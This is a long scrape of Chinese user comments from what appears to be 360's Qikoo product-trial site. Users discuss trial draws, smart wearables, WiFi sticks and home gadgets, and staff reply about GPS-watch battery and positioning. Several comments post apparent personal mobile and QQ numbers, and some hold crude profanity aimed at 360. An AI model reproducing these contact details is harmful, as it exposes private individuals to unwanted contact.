让我中吧，亲爱的360！ 
什么时候有货，为什么还要预约
一款超智能的手表，支持电子科技。
好赞的手表~
沙发。。。
申请了。。。。但愿能中。。。。。
好像得到啊
我是10酷币兑换的，刚使用一下，不错，就是不习惯，也许用用就好了！
我使用了智键相机，闪拍，手机加速，手电筒，Home键和自定义的功能，基本可以，比我想象中的好！
什么时候发售啊？
是个1代2代都用过的幸运者呀。羡慕。小红花在手机客户端实时轨迹旁边的奖杯图标里，点击进去会看到红花榜。报警功能1是长按手环上面的按键，手机会报警，2是蓝牙随行时手环与手机距离远了手机会报警。3是孩子在陌生区域呆着或陌生道路行走时间长了会报警
改了已经 可以直接去京东购买~~
什么时候能买到啊 55555
支持。！！
超赞的东东呢！申请了，希望能中啊。。。 能优先使用的感觉超棒！
每次都很积极的申请，也是一次都没中的飘过..... 
建议非常好。而且排版也很专业。
如果要是能和空气净化器结合着用起来，那是不是就非常赞了。
三星的智能手表不是叫gear吗？
主要是我太上心了，因为我真的觉得奇酷这个平台很好，上面的东西都很酷，都是其他平台很难拿到的。
感觉外形非常高大上啊。很有科技感。
很喜欢这个音箱。很想买一个。
是这样的，它测到空气质量不好的话，可以通过SP2(智能开关)，或者RM2智能遥控来控制加湿器/空调等，来净化空气。所以它只是眼耳鼻。
楼主写得真好
太赞了！！！！！！！何时能出，希望尽快面市。
谢谢你的鼓励
bucuo
希望能中啊
是只能和博联的设备连起来吗，能和家里普通的空调、净化器连起来吗
怎么申请不了了
喜欢！！！！！
申请好多次了，希望能中！
博联的智能插座和智能遥控，可以对家庭中的设备进行管理
这是我猜的，不过应该是这样的
支持360，坚持
非常帅的智能体重秤啊。想买一个。
就这功能  也太鸡肋了吧！
申请那么多次了，一次都没中，我人品太差了么，对电子产品这么了解，去不选我来试用一下
淘宝上有299元，7月份发货
希望我能在6.27申请试用成功 6.27也是我姑娘100天纪念一下吧
希望我的申请能够通过了！感谢奇酷网和360随身wifi了！
强烈反对360对此产品进行任何行为！
这能算的上试用报告？
浪费了，报告竟然这么对待
板凳都没了，哎
我每一期都申请 我希望这一次能中 
希望可以获得试用哦！！！一直想要运动！想买这种穿戴设备！
我最期待的就是它了
期待哈，希望能中啊，
我每一期都申请 我希望这一次能中 
高考结束，以运动的方式来放松。
可以去京东购买了哦~~
申请好多次了，希望能中！
希望奇酷能让我获得，我一定会好好写的 
I want have this 
这个应该是插卡的  要不怎么用移动4G啊~！
申请好多次了，希望能中！ 
这能算的上试用报告？
希望能中,希望选上我
我是个骑行爱好者，有这样的设备，那骑行会更快乐！
一直关注着，希望能中签
申请好多次了，希望能中！
不中，只能自己买了
期待期待~~大爱360~~大爱奇酷~~
没连网可以用吗？
不知道价格多少
能越做越好就行
顶起。超越、飞跃。
貌似这些产品的功能都差不多
不错的东东！ 
不错的东东！ 
怎么用酷币兑换
不错！！！！
真希望通过
希望被360抽中我 
一直关注求中啊
今天使用结果公布，。。。。
希望能通过
期待有我的，
价格的确是太贵了，没有什么意义
还要等到11点么，真想快点，
这个希望也能中奖哈，灰常期待，灰常感谢360这么好能够提供***的机会，
看上去不错哦。
申请结束了，今天发布获奖名单。
求中枪，千穿百孔
希望可以尝试下这次的新产品，很期待~
对于这样的试用报告，我只想说：擦
有没有我的
期待中奖ing
对于这样的试用报告，我只想说：擦 
我宣布，此报告不合格，驳回重写
申请好多次都没中，希望这次能通过。。。
等你行等到我心痛……
这个真的很环保，但是价钱有些小贵
有我了吧这次
等待中。。。
求 中关注
真心求通过~~么么哒~~
不要998，不要99.8，只要9.8，萌萌的楼主带回家，即可么么哒，又能啪啪啪
牛B了 》》》》》》》》
请问在哪购买啊
快点阿，通过我吧。
挺方便的啊
好牛掰的啊
今天我能通过吗？
全能大神，请让我通过吧！真心希望能通过。
我的通过就是我支持360的动力。
确实，热熔胶枪。出料嘴也是铜的，就是做成笔的样子而已，有啥高端的。
酷，简，时尚
今天我能通过吗？360软件我都用了好几年了，我的通过就是我支持360的动力。 
哇，，好好看
看起来不错的样子，就是稍显笨重。不知道圆形显示的分辨率高不高、显示颜色色差大不大。对，还有电量的问题。
还好吧呵呵
感觉自己买比较现实点。才50个使用。人数却这么多。
等待中。。。
各位亲们。。请保持平常心态面对。。不要因为这样而搞得茶不思饭不香的。。划不来。。
求中枪啊  求机枪扫射
奇酷就是酷！！！ 
我感觉到人类好神秘啊！！！1
有点意思啊
我有情，奈何you无意啊
不错不错不错不错
趣教结和！！！！！
好的,谢谢现在这个产品在点名时间众筹http://www.demohour.com/projects/343766
现在这个产品在点名时间众筹 http://www.demohour.com/projects/343766  
好的,谢谢现在这个产品在点名时间众筹http://www.demohour.com/projects/343766  
期待中！！！！ 
啊啊，太激动了竟然中了，中了，太幸运了，
我都没有通过，把我的ID记住，你们会后悔的。
产品功能不错，我在点名时间预定了一台。http://www.demohour.com/projects/344836
太好了，中了，激动，这是第一次中奖，嘿嘿，感谢360，奇酷
没发预约，净扯淡！
没中的，报到下。             
奈何无我啊
Thanks 中啦
没中，太不够意思
希望中的，我已经等这个东西好久
。。又没中 什么逻辑吗。公开抽选行吗
求中啊，来个开门红！！
第一次申请，求手环！（杜绝复制！）
失望。。。
哎，没中，真失望啊，不过一样会继续支持360 
对于这样的试用报告，我只想说：擦
值得试试~不知道不理想~
没中，继续努力中。
孩子一定喜欢！！
期待下次活动
没中... 
中了会怎么通知啊？
很幸福的感觉，终于被抽中了。。。。。
概率好低啊 ，是不是噱头啊 ，都是内部就认定好了啊 
求中...很久没中了 
哇哈哈。。没中。。可以不用写报告哦。。
不中没关系，关键是什么时候可以买啊
现在45000多人中奖概率才0.1%，还没排除走后们的关系户，我操，要是我中了，一定坚持买1年的彩票
失望。。。  
还真有个倒二的人根据图片的二维码，去绑定我的这个手环，号码：15618988459
不错   想知道乐曲什么的是  有专门的音乐库吗
呵呵，终于好运来临，感谢奇酷给的这次机会，好好准备我的试用报告。
时间是自动对时的，不用自己调。
我也这么觉得，试用两次，没一次中的，真是内部搞的活动、
又没中，失望
我写了那么好的建议居然没中，太失望了，，，以后不参与了。。。
欧耶--终于好运来临，终于被抽中了。。。。。感谢奇酷给的这次机会。
我花了十几分钟写的建议和评价，建议没被评上，气死了……
健康有关如血压心跳
可以购买的，目前正在众筹，地址：http://www.demohour.com/projects/346403
MD,想学小米啊 ，草
2岁的孩子试用，我只能说草360，瞎B眼了
草360你的B眼，瞎了
草360你的B眼，瞎了，，，都是你们内部的人员吧！
草360你的B眼，瞎了，，，都是你们内部的人员吧！
    很好，期待中
就这个报告还像样一点，就不发表不满了！
又没中.......
应该不错    要是能导航更好
希望中的，我已经等这个东西好久。。。。。。
这是真的吗  很好的设计
金立GN700T用不成。
多少钱 啊   求适用
最近我的身体出了点问题，正在进行体育锻炼（游泳.跑步），看了该产品不错，挺适合我。期待中奖。 
如何中的？
我们学校买了一个，但比这个小，580元
是不是360骗人的  害我等了那么久
又又又没中
不是说发布360路由器的话我早就买其他牌子的啦！现在 看来是没希望了！
方便是很方便，安全最重要
唉，无语了
太棒了！这么多次终于中了！！感谢奇酷，感谢老天！！希望bang手表还可以被抽中，奇酷真是忒给力了！
、、、、、、、、、、、、、
为什么没有我啊
又没中...... 唉 为什么为什么..............
没中，继续
又没中...... 唉 为什么为什么.............. 
这个真的很好用，希望能中...
又没有中！！！！
什么时候有货
又没有我，哎，期待下一下~~~
没有我啊，呜呜...伤心ing
竟然没有我，这不科学啊
也木有俺。。。
不错，还能助减肥~
试试，看起来不错
这个 小孩子肯定喜欢！
你TM糊弄人呢 图片都没有叫什么报告
用纸电池还不如用太阳能呢 就是价格受不了
哎，没中奖，但还是力挺360.希望下次能中奖吧。
垃圾测评 把东西送给这种废物太浪费
又是一个垃圾测评。。。
这都什么测评 说和没说一样
现在这个产品在点名时间众筹 http://www.demohour.com/projects/343766 
这个东西真心不错，
孩子的超级玩具！
什么时候能不预约抢购，可以直接购买就好了~
什么时候出？价钱大概是多少？
中奖是逗你玩，，想都别想
希望下次抽到我哦！~
哈哈。奇酷网永远都是走在时尚的前沿，真好
我买过类似的产品，效果不是很好。希望这个有惊喜
又是一个期货哎~~~
好期待呀 ！！！！！
热熔胶枪改版
孩子上学希望能用上，怎么还没有发售呢，逼得已经看了几款近似的产品了，不过还在等待360。至少在9月之前发售吧！
没有中啊，怎么抽的！！！
申请了好多次都木有一次通过，真心希望这一次可以申请成功！
哎呀......，衰啊....
同意，我又缺U盘，又缺WIFI，气煞我也
浪费资源，官方怎么筛选的
预定了，没给我，失望
Pro......
在360抽奖从来没有中过，
说这话一点常识都没有，现在这车已经进入中国了，朋友他们买了好几台，用得效果非常好，起步速度比跑车快多了
真赞    来看看电子秤能为我们智能家居带来点什么
这叫三弟打印笔啊？上次粘东西的时候就用过！
发布吧，360元。我支持，我买了！哈哈
从来没有中过 
万元以上吧？而且必定是土豪家庭才能买的起，还得要ipad
嘻嘻，我想使用啊
土豪手机围观吧还是
360是打着免费的幌子骗大家关注的，这种行为太无耻了
3D打印笔还不错。
下载个微定app到爸妈手机上就行了，随时随地能知道爸妈在哪、安不安全。
么么每次都是金币~伤心累~！！不搞了 
哇塞这个都开始啦~~
能不能加上mp3功能，做成一个360军刀（瑞士军刀）
用酷币兑换的360智键，今天到手了，迫不及待的插入后没有反应，一按只能直接进入音乐播放器，播放歌曲还没声音，这什么情况啊？？？安卓4.0的手机不适用？？？=_=|||
我有密集恐惧症
 期待中....
期待，功能挺全面的
价格才是王道
哎~申请了一次结果没中，积极性被打消了.....这回看bong挺好的，再试一次，一定要选中我啊！
功能强大，外观新颖，不错的东东 能解决固定该设备的问题就更好了。
价格才是硬道理
360是打着免费的幌子骗大家关注的，这种行为太无耻了.中奖是逗你玩，，想都别想 
看起来很好 
很好奇    啊   什么时候有啊 
来来来,前排观望!坐等这个送女友呢!
我告诉大家，重在参与
五颜六色的。。
赞！（为啥评论字数应在5-200字之间）
各位,这个酷品是我推荐的.近期拿到工程机,表示根本用不了,完全是个残次品.大家还是幻想幻想,先不要去买
高科技啊！
555555555555555555555555555555555555555555555555555555555555555555555555555555555
优盘啊5555我要- - 
期待！赞一个
大赞、顶起！
太喜欢了、
是个好东西！
早就发售了。。天猫早就有卖了各位。。
快点上市吧
哟西  这个貌似不错耶.刚好生完宝宝胖了,要减肥,这个要是能测出数据,在根据数据制定减肥计划岂不是很好
玩不起的节奏
就这样的人也能给几会？真是太浪费了，本人有淘试用九次中签的经验，不是吹的，虽然不敢说哪篇都是好报告，但我最次的报告也比他这报告强百倍，希望你们能考律一下，其实淘试用的报告和贵网需要的报告形式基本一样，如果不想信我，可以私聊我给你看我的淘试用报告，不要再浪费资源在这样的人身上了。
快啊    期待   老是让人干着急
 不错 奇酷公司所提供的***很不错，第一时间体验高科技
奇酷，你好牛，。加油
耶耶耶  等了半年了  终于梦到 梦寐以求的东西了
可能申请不到，不过重在参与，要相信自己，相信Qikoo
我也很想试用一下，让科技体验一下现代高品质生活！
我很想试用一下，好期待！
一周目前来说做不到，GPS定位本来就是耗电大户，而且手表还要经常地上报位置信息。为了定位精准，儿童手表在一代基础之上增加了wi-fi辅助定位和g-sensor智能纠偏。所以，相比一代为了定位精准增加了硬件芯片，但是同时把续航也延长些，360在软件上的省电优化已经做了很多的工作。不过我觉得，穿戴式产品的电池续航，是普遍存在的问题，一定要找新的技术手段来解决。
多参加活动，总能中的
我觉得针对报告写的好的大神们应该增加申请公测成功的比重
可能申请不到，不过重在参与，要相信自己，相信Qikoo
什么时候卖了，点着矛坑不拉屎！再不发售黄瓜菜都凉。
看上去应该不错吧，赞一个！
试试，重在参与，支持360！ 360还是可以的
哥们千万帮帮忙，我也是其中一个，不过我咋总是找不到试用报告在哪里写，麻烦你教教我，我的QQ是1620523549电话号码是18020403080  可能我实在是菜鸟，我已经绞尽脑汁也找不到，真的求求你帮帮忙告诉我啊，已经迫在眉睫了。
期待中。。。。
用皮套子把脚套住 我在想万一出现紧急情况要把脚放地上 是不是很容易摔倒啊 
13万··
这个车很容易上手 代步也很拉风 不过我一想到是代步 立马在脑袋里把常走的路线过了一遍 走公路肯定不行 太不安全 走人行道吧 人行道比公路高约10公分 我们这边很多地方的人行道在过马路的地方没有设置专门和公路接轨的下坡口 那就得提车下道 过了马路又提车上道 估计 在旁人的眼神里就会从飘逸 拉风 变成气踹嘘嘘的劳累形象吧 ^_^
嚯嚯嚯！！！老衲中到了，等了六期了。。。
不要中不到怪人家，自己不用心，写的再多，废话和不切实际的话都白搭。。。
什么时候能发售，敢不敢来个准信。 
申请试用这个东西看得是运气，重在参与。好吧，其实我还是蛮期待的。Give me!!!!!！
表示没看懂这东东是干嘛用的
孩子的玩具？够奢侈
这个感觉比较实用，不仅儿童，老人都使用，期待试用。
盗版的米健 
材料也会很贵 吧？
莫非只有奇酷用户才能中奖？
科技再进步，手环再发展。十五年前数字显示的大哥大还一万多呢，那时鸡蛋才2块多一斤。
我居然看完了- -.
折叠式电动自行车几年前就已经有了，我公司就有样品了，国内也已经有的买了，只是样式一般人不习惯
减肥神器哦，支持一个先！
期待中，希望自己很幸运一次
有些想科幻片哦
骑行，能让我疲惫的心灵得到一次休憩，让我们拥抱失却已久的自由，放飞尘封已久的梦想。或许进行一次长途骑行会失去一点东西，但是，得到的比失去的要多得多。无论是骑行***、骑行中国或者是国外骑行，都不重要，重要的是我们在骑行中得到了什么，领悟了什么。骑行就是骑行，无所谓伟大与平凡，2000年九月份手机最后一格电，曾经挽救过我们十六人的生命，那一刻终生难忘，别不多言，铁定支持！
我正在减肥哦，真心需要哦，有了它对我的减肥事业能有更大的帮助！先赞一个。
然后，你想说什么，菊花莫名一紧？还是，我去，我竟然比你更无聊？或者，我自横刀向西笑，理应自挂东南枝？
听闻你中了第十一期的WIFI U盘。。恭喜哦。。。
看上去应该不错吧，赞一个！
确实中奖了 好多期了 才中这次
跳绳棒棒哒！~\(≧▽≦)/~
期待自己的幸运
感觉还是很洋气的东西，就是不知道怎么样。虽然像我这种被抽中的概率很小，但是还是抱有侥幸心理吧。
好想要啊，送个吧，
现在这个产品在点名时间众筹 http://www.demohour.com/projects/343766 
主题的好帅啊，酷
一直让他中合适吗
好神奇的东东，功能很强大的样子，如果效果真的那么棒，一定要给家人、朋友都送一个，是个很不错的礼物。期待试用~~~
实时路况的基础上加上导航和电子狗功能呗，驾驶习惯分析和车车健康监测确实很实用，赞一个！
看上去应该不错吧，赞一个！ 
貌似不错的样子
挺厉害的样子
家里那么多电器得买多少个啊。。
弱弱的问一句大件的垃圾它怎么处理？比如纸团。。
奇酷网的试用产品就是酷啊
可能申请不到，不过重在参与，不知道功能够不够强大要相信自己，相信Qikoo  
多少钱啊 ，貌似很贵吧。
中到了，等了3 期了。。。 
你也可以中的哦 
奇酷的试用产品越来越吸引人了。针对各种用户人群。要支持一下。
写的真好，图片做的太有感觉了，很用心的评测。
谢谢，就是觉得试用机会来之不易，要用心写才对得住这份幸运和信任！
两个按钮的手感，已经做了改善。做成一体的，即原来两个按钮连成一个，这样就不会松松垮快了。
很期待，继续关注
邮寄到了，就是不懂用
我的是在游戏，画吧，里参加比赛2等奖得来的
图片很专业的感觉！
入门单反+台灯打光+超业余摄影师。。。
中了   要中了啊
这货中了，小伙伴一起骂他
求中呐.好运快快来！！！！
一个字“中”！！！！！！ 
有中过一次以上的么？？？
希望能中，一定要中，我是当时申请第二个
看起来还不错，不过国内的Amazon好像不怎么样
电子狗的功能也就国内要用，唉，国内交警的素质，就知道搞钱
希望能中，奇酷，好奇怪的名字
告诉我给赞，给评论的好处吧，等我谢了报告也要同求 。
中!听天由命吧，都申请了四五期了，没有一次中过 但愿这期能中，对试用都 快没信心了
爽爽爽爽 　　就这个feel 倍儿爽 倍儿爽 　　这个feel 倍儿爽 feel feel倍儿爽 　　爽爽爽爽
真的很前沿啊
一定要中啊 
连续投标····希望渺茫····
我去啊···快给我邮过来··
使用时儿必须开电脑吗？
这个太适合我了，我正好要减肥，这个测试数据应该相当有效哈哈
哪天开始啊？
期待自己的幸运..期待中。。。。
不止是照片拍的给力，报告整体内容页的很很赞
期待自己的幸运..期待中。。。。  
亲：报告写得不错，从你的报告看来产品不错，但我们1、2代都没有见过，也不知如何评价了，能不能借我们这些代代不中的瞧瞧，看完了就返回给你，！！希望早日开卖呀！！
一定要中啊
看起来很赞哟 ！！
求中，很喜欢，设计很新颖，外形很简洁，期待更多新功能的完善开发
我中奖了， 但是不知道怎么给发过来啊， 也没个通知呢 亲。
哈哈作为360忠实粉的本屌中午中得一签
咳咳咳！！！老衲等了六期了。。。
收到了智键君，很好用，三星手机上非常灵敏
妈的我没中签      都怪你
299元能便宜点吗1元吧没钱啊 
希望嫩便宜到1元啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊
希望中吧。提前感受一下
诚心喜欢这个随身WIFI 
一定要给我啊！好期待
好期待啊！ 什么时候开始呢？
中签了也应该有个通知吧，最想问的是啥时候发货?
啥时候发货呀，急死我了
1代产品还不成熟，所以360根本就没有卖。 2代产品已经接近成熟，估计再稍微改进下就能面市了！稍安勿躁！ 
我要志在必得，要不给我马上卸载360从此不在用关于360的任何产品很软件。。。到底是不是坑爹货拭目以待。。。。。。
高科技产品值得期待，功能强大，设计新颖，简单而大方，希望能拥有并向所有认识的人推广。
柯南制作的？ 
到底能预约吗，上次的预约码还有用吗？要是没有，我就买其他牌子的路由器了
上次出门没有赶上，郁闷了
就等你偶，，，，狂喜ing
希望可以出16G版~！
希望渺茫。。。。。。 
不错，不用买书了
无线充电不太好实现.
每次都没我
 已经提交申请，希望能中，支持360 .
我去年买了个表，看看介绍都从别的照抄过来，还他妈说是HTC团队，有点职业惊声行不行啊？满篇“按照HTC的说法……”妈的完全第三方啊  “按照HTC的说法，M8设计成这样，是为了提升这款手机的握感。……………………………… ………………………………………………”
谢谢，之后还会继续更新完善的。
图美，写得也很中肯，这样的测评才有意义。
我在这款产品还“处于创意中……”的时候就在评论中说道市场上这种产品早就有了。现在点击“立即购买”进入京东商城界面完全吓一跳：因为这款产品的名字和我早在两个月就看到的一样——小K。当时是我所在城市的”小K地区代理”在宣传这款产品，说的给经销商的价格是90还是99我忘记了。这个要是有在大城市电脑城工作的朋友应该有接触到。     由此可见360奇酷是不是所谓的科技创新啦！呵呵，我去年买了个表。
这款产品就相当于一个插排。但是人们一见到新事物特别是带有科技的符号一下子就被忽悠了……想想即使你给电视、电饭锅之类的通电了，不还的按一下开关电视、电饭锅才能工作吗
这款产品就相当于一个插排。但是人们一见到新事物特别是带有科技的符号一下子就被忽悠了……想想即使你给电视、电饭锅之类的通电了，不还的按一下开关电视、电饭锅才能工作吗  
完全是鸡肋，想想给电视、电脑、空调、电饭锅通电他们就工作了吗   不还是的按一下控制开关吗  
完全是鸡肋，想想给电视、电脑、空调、电饭锅通电他们就工作了吗 不还是的按一下控制开关吗  
完全是鸡肋，想想给电视、电脑、空调、电饭锅通电他们就工作了吗 不还是的按一下控制开关吗  
中一个吧！ 
呵呵...写的不错 希望继续更新
希望能继续更新 ...
很希望可以得到一个试用用的机会  好运吧 
hehe，我木有中耶~~
你不会还没有孩子吧。。。
我的也中了，就是不知道发货了没有。好着急呀！快点到手里来，我想赶紧试一下
中吧，中了给意见(⊙o⊙)哦
中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中中
厉害👍好思路经济起来后可以推广
好厉害，就是2.2四核是不是对有些人不够用
哦，好方便，但没用过，不好评论
想（像）要（个）一（耳）个（麦）
好东西，夏天冬天开空调的都有用，很方便，定推广
隔天来看看。
鸡肋产品。
这个价钱很“合理”，苹果的存储价格就是16g100块人民币，1g6块多
感觉实用性不大
同意，折合200张毛爷爷头像了，稍稍改点价格 得让人接受吧
喔~好棒的产品
期盼产品的到来！！！！
还能不能及时更新一下啊，，创意都 完了，，
看评论还不错
申请N次了  一次都没有中  难道我的点太背了？？？？？？？？？？？？？？？ 快不相信奇酷了\1
你想说什么？
好棒  好精致             
这东西装门上最多三天就被人扣走了，如何自身防盗也很重要。
其它功能一般。不是很实用，门铃还行，就是价格太高了。
一台3D打印机，再配一台3D抛光机，老百姓还是再等几年吧。
这个变废为宝的创意真的不错，但是价格有点高了。能大众化的定价，相信很多人都会购买。
写得不错啊
什么时候发货呢？
今天都22了
能中不~~？
应该第二期的会有很大的改进，第一次的有很多不完善的地方，穿墙效果奇差~！期待第二期~~
发货了么，
为什么没有通知，
提交报告还有14天，那，怎么还没到
我想要一个
即将开始。。。
这个是真的吗？？
好期待啊！
好期待啊！
希望一定中，我已经等好久
申请了好多次了，看看这次怎么样了！几率太低啦！
不知道效果如何，854X480的分辨率，确实底了点，
中一个中一个
真的好用买一个也无所谓啊
感觉很酷，期待中
开机后，手表会去与网络上的服务器对时间，校准时间，所以会花个几秒种样子。
控制这个飞行器的应用“亿航飞飞宝”点了下载地址的图片链接没有反应，怎么解决？
控制这个飞行器的应用“亿航飞飞宝”点了下载地址的图片链接没有反应，怎么解决？
写的不错 将来和更多电器结合才能营造智能家居的狂潮..
我看了你的地图，你应该在家里，家里有wifi。手表在室内的时候，无法收到卫星信号，所以通过wi-fi来定位。  1.地图中有个蓝色的圆点，是表示手机所在的位置，我发现你的手机的位置也在变化，有漂移。所以手表的也跟随着漂移。 2.针对漂移，儿童卫士的服务器端做了算法优化，360会持续改进这部分算法。
现在人们对健康更加看重了，只要质量好使用方便，功能实用一定会购买支持的
什么时候发货～～～
怎么用啊？？
。。。。看到旗舰店上面的评论。。。真的不大敢去买。。。
中一个，中一个
特期待   一直相信360的产品   我用过360随身wifi一代   和360与磊科合作出品的路由器二代  东西很不错，
特期待 一直相信360的产品 我用过360随身wifi一代 和360与磊科合作出品的路由器二代 东西很不错， 这次虽然没有得到   但是我相信360会出现更好的产品呈现给大家  也希望自己下次能成为幸运儿
  好东西，夏天冬天开空调的都有用
我也在等，因为是第一次试用，好多功能都要熟悉下。这个月底还要到外省出差，好事都赶到一块了，还真有点忙不过来了。就也不能错过写报告，太不容易了。
无所谓，大家要抱着平常的心态肯定能中奖，就算这次没中可以等下次活动呢！！！坚持是肯定能拿到东西滴！！！坚持到底，永不放弃，加油！！！
看看我运气怎么样、支持360
还剩16个小时，幸运女神快来吧！！！嘻嘻嘻嘻
人类的朋友。
699没试过感觉挺贵的、希望以后可以便宜点、当然最希望可以试用
beautiful！！！就是价格高了点~~~
很想来一个
这个给力啊、希望快点出
哎，从来不中
感觉还不错已经提交申请了希望能中，支持360。
期待，赶紧的
一直支持360，希望可以中哦
希望中，支持360
very支持360，希望这次有我
我喜欢这个
是啊 。。。。。
很赞的一个好东西
支持 支持 支持  支持！！！！！
有这东西遛狗方便了，你们说是不是，
就一热熔枪
不错期待中
苦  等  呀!
写了6，7条。希望人品爆发有我。。
线条简单但很有创意，不许不赞
做工有点毛糙哦
有创意啊，学习了
很有意思的东西
不用出邮费。要好好写报告。
看运气咯。
360随身WIFI4G版，可连234G网络手机卡流量
都说华硕是中国DIY厂商集成度最高的果然名不虚传，用SOC更好，看英特尔，希望有麦克斯韦的显卡明年第二季度吼吼
支持一下。。
比几个月前便宜，AMD过万了都，希望麦克斯韦构架的旗舰性能超强CUDA理智过万，
幸运女神拿机枪狂扫我吧！！！！
希望内置锂电池
好得意，真不错。
人生第一次交给小编你了，求中啊！！！第一次啊！小编给点力啊！
主板不太规整，结实耐用功能多最好，
小编晚安喽！！！
.................................
实在等不到试用了，自己买了一个，话说还真是冲动型消费啊，今天刚收到，戴起来挺好的，正在使用中，过几天上报试用心得，样子真不错，也不用管它，洗澡也不拿下来了。 
我也是学生，你7月4号就考完了，应该是初中生，(我们7月23才放假)，一天不负责任，测试一下能要你几分钟，工作人员就不应该给你→_→
防水如何？
有没有蓝牙防丢功能？
 我想分享到微信朋友圈哎~~~还有那个食品级的用料选项，怎么提示超过12个汉字不能选 这系统自带的，我吐血啊
试用主要体现产品的优缺点撒
亲：转给我们大家评测下，评测完毕后返回给你，如何，同意联系我370649358
可以参考GOLO这个已经面市的产品，本人从事某国内汽车电子品牌，对项目感兴趣。希望贵团队可以和我取得联系，或许在产品本身或者营销上有所合作。企鹅：壹柒玖玖玖玖玖玖伍
电量我来解释一下，在电池、充电小熊我们都做了改进。原来的小熊与电池组合，相当于快充，大家发现充满电很快，充得快消耗的也快。后来我们改了下电池的匹配电路，和充电小熊里的电阻，使得充电过程为慢充，2-4小时使得电池充满。经过我们测试，使用这种充电方式后，可以达到48小时，甚至更久。
定位的话，你还没有用到wifi定位。手表里边内置了Wi-Fi芯片，所以如果室内有Wi-Fi信号的话，定位就会非常精准。因为在室内的时候，无法接收到卫星信号，所以通过基站会有较大的漂移，而通过Wi-Fi的话就会精准很多。
当然是希望电量经用，不过总的来说，这个产品还是非常成熟的，谢谢
wifi会比较麻烦，现在上海没有全城免费Wifi，而且iShanghai还需要通过短信号码验证的，你也只能在熟悉的地方定位，没有通用性，我感觉，当然在Wifi的地方定位会好，不过我觉得只是用起来感觉好，但是这个产品应该是防范万一的，陌生的地方能连Wifi吗，只是个人建议，谢谢！
你家孩子真聪明啊，哈哈
什么时候发售啊？就是支持360啊，快点发售吧
朋友 你收到 随身WIFI U盘版  了吗   
支持，美国人就是厉害，苹果出来引领手机潮流之后，还有人继续搞创意、创新，而不仅仅是跟着苹果后面亦步亦趋，难怪美国可以领到科技潮流那么多年。
谁可以告诉我  怎么查 随身WIFI U盘版  发货到那里了 
人生第一次交给小编你了，求中啊！！！第一次啊！小编给点力啊！
前两次申请没有通过，不知道这次的结果怎样，……
中肯，早点发售
thx : )
这个东西看着挺好的。 
不错的试用报告，努力做的更好！
发货了没有啊
一定要申请成功
期待期待~~一定成功~~
这个不错！喜欢
神啊，保佑我I吧！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
到现在还没收到，发货了没？好期待哦
支持英文吗？用户可以自定义控制语音吗？（比如要控制电视打开，音响打开，用户事先设置控制语音：小球，开始。然后就执行定义好的操作）
看起来很牛的样子，好想要啊~~~
带不带人脸识别功能啊。有人来访，自动加入后台数据库，如果不在后台数据库保存过的人脸数据，则立即发送邮件或者通过微信发到业主收集上。
写的不错，手表这么一看好漂亮啊
期待～～申请成功
是的！现在在众筹期间，作为回馈第一批支持我们的客户，我们将邀请他加入我们的Ghost G300 VIP 客户，他们将比普通客户得到更多更实在的优惠，详细优惠情况请关注我们的点名时间网http://www.demohour.com/projects/344944
如果鱼缸的空气质量好，可以再身边养一些花，或者在浴缸里睡觉也可以呀
为什么字体下划线保存之后，页面上不显示下划线呢？
您好！因为我们现在正在进行一些软件升级，所以链接没有反应。但是在点名时间众筹结束前一定会给广大客户开放的。请实时关注我们的官方微信EhangUAV，微博EHANG亿航，及点名时间众筹网http://www.demohour.com/projects/344944。
liuyang88815 使用是最好的选择，能把周围的空气质量检测一遍，还能对手机app进行深方面的检测，我顶一票，给你点32个赞
管理员是可以踢人的，长按就可以了
实在是太无聊了，一支热熔枪来欺骗大家。老掉牙的概念。
确实有专业的拍摄水准啊。而且报告也很实用。
应该增加一个拨号功能，这样孩子在学校里有什么事可以直接电话联系家长
姐对各位中奖的朋友只有羡慕嫉妒恨了:&#039;(
期待，期待，我一定要中
又是一款水杯。但是这个外形还是不够炫酷啊。
亲现在申请已经晚了吗
对于防止手机丢失,是最有用的,其次拍照也很有创意
  在申请了N次之后 我终于成功了   哈哈   感谢奇酷网  果然不是内定的   东西还没到手 到手后保证提交高质量的报告
没看见有音频接口，怎么连接车载音响？
期待期待，速度申请。
声控的识别准确率多少？有效范围几米？
不错～爸妈会喜欢
 这个创意真的很好  在街上 手机被人偷走拿开了  马上就叫 非常实用  希望尽快能用到
怎么还没发货呢？
呵呵……路过~
这产品真是毫无用途，3d打印是可以精确控制的，这笔要靠我们抖动的手来控制形状，不可取啊。谁会买来作画呢，而且颜色单一。一个好的试用者，不是要怎么夸赞产品，而是要公正的评价出产品的利与弊。这样才能真正推动产品的改进。针对这款产品就不用改进了，直接终止项目吧。
吃不到葡萄说葡萄酸吧。拿到后就能写出那么好的报告来，谁信啊，那不得等真正试用过吗！有修改报告这个功能就是让大家在使用过程中把遇到的问题随时提出来，对产品的更新才有帮助！！！！！！
关注……希望价格不要太贵，性价比要合适哦
鼓掌鼓掌……减肥是最需要鼓励和支持的事业啦
这个应该符合人们对健康饮水的要求吧……
我想增肥，这个能帮上我么
跪求啊！！！！爱运动   希望得到一个 
我也是想增肥！不知道就是肥不起来！
样子很美观、功能很奇特！得之，我幸，不得，我买！
楼主高二学生么？
我的也没有到，
怎么还没有到，为什么不能看看到哪了，
我想增肥 我老婆想减肥  。。拿到就好了
时云RyFit云悦智能体质分析仪参数,在外观的设计上，云悦体质分析仪还参考国人大多不超过45号鞋码及国内地砖规格，定下300mm×300mm的规格设计。
不错 可以试用一下           
期待，期待，我一定要中 小编给点力啊！
很实用啊，好想拥有完美的身材啊，希望能申请到
对身体健康的了解非常重要，监控身体的各项指标尤为重要。
牛逼赞..大赞
主要是价钱和耗材
太喜欢这个东西了，希望能得到试用的机会啊！
每天踩一踩，快乐一整天
能明了的清楚自己的身体状况感觉很实用，希望我能通过筛选！！！
不错的报告,提议也好.加油
非常好呀，健康，实用
但愿这次能中，给自己和老公一个健康的激励
非常好，非常好
能源问题一直是科技发展的瓶颈，再好的东东，就怕没电。不知道什么时候能有新电源出来
